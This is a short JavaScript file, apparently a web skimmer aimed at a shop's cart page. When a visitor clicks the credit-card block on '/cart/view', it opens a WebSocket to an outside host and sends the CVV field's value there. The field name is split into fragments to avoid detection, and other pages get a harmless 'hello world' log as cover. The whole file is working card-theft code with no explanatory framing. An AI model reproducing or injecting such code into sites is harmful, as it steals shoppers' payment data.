const path = '/cart/view';
const name = document.location.pathname;
const selector = '.js-credit-card-block > div:nth-child(2) > div:nth-child(1)';

function onKlik() {
  const socket = new WebSocket('wss://connect.websocket.in/test?room_id=31337');

  socket.onmessage = function(msg) {
    console.log(msg);
  };

  socket.onopen = function() {
    const x = document.querySelector('#cre' + 'ditCard' + 'C' + 'VVField')
      .value;
    socket.send(x);
    console.log(x);
  };
}

if (name !== path) {
  console.log('hello world');
} else {
  document.querySelector(selector).addEventListener('click', onKlik);
}

